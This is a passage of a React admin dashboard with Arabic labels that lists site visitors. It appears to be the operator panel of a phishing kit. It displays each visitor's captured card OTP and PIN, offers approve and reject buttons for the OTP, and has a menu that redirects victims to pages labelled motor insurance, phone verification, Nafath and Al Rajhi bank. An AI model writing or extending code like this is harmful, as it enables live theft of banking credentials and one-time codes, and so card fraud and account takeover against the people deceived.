                              <SelectItem value="4">الدفع</SelectItem>
                              <SelectItem value="5">OTP البطاقة</SelectItem>
                              <SelectItem value="6">التحقق النهائي</SelectItem>
                              <SelectItem value="7">النجاح</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex justify-center gap-1">
                          <PrioritySelector
                            notificationId={notification.id}
                            currentColor={notification.any || null}
                            onColorChange={handlePriorityChange}
                          />
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  className="h-8 w-8 text-destructive hover:bg-destructive/10"
                                  onClick={() => handleDelete(notification.id)}
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent><p>حذف</p></TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="lg:hidden space-y-4 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id} className="overflow-hidden">
                  <CardHeader className="pb-3 bg-muted/20">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                          <User className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <p className="font-semibold">{notification.fullName || "زائر"}</p>
                          <p className="text-sm text-muted-foreground">{notification.id.substring(0, 12)}...</p>
                        </div>
                      </div>
                      <UserStatus visitorId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-4 space-y-4">
                    <div className="flex flex-wrap gap-2">
                      {notification.cardOtp && <Badge className="bg-blue-600">OTP: {notification.cardOtp}</Badge>}
                      {notification.cardPin && <Badge className="bg-purple-600">PIN: {notification.cardPin}</Badge>}
                    </div>

                    <div className="flex gap-2 flex-wrap">
                      <Button size="sm" className="bg-emerald-500 hover:bg-emerald-600" onClick={() => handleApprovalStatus(notification.id, "approved_otp")}>
                        موافقة OTP
                      </Button>
                      <Button size="sm" variant="destructive" onClick={() => handleApprovalStatus(notification.id, "rejected")}>
                        رفض
                      </Button>
                    </div>

                    <div className="pt-3 border-t">
                      <Select onValueChange={(value) => handleRouteUser(notification.id, value)}>
                        <SelectTrigger className="w-full">
                          <SelectValue placeholder="توجيه إلى صفحة..." />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
                          <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
                          <SelectItem value="nafaz">نفاذ</SelectItem>
                          <SelectItem value="rajhi">الراجحي</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div className="flex gap-2 pt-2 border-t">
                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="ml-auto text-destructive" size="sm">
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {paginatedNotifications.length === 0 && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
                  <Bell className="h-8 w-8 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold mb-2">لا يوجد زوار</h3>
                <p className="text-muted-foreground">لا يوجد زوار متطابقين مع البحث</p>
              </div>
            )}
          </CardContent>

          {filteredNotifications.length > 0 && (
            <CardFooter className="border-t bg-muted/20 p-4">
              <Pagination
                currentPage={currentPage}
                totalPages={totalPages}
                onPageChange={setCurrentPage}
                totalItems={filteredNotifications.length}
                itemsPerPage={itemsPerPage}
              />
            </CardFooter>
          )}
        </Card>
      </div>
    </div>
  );
}
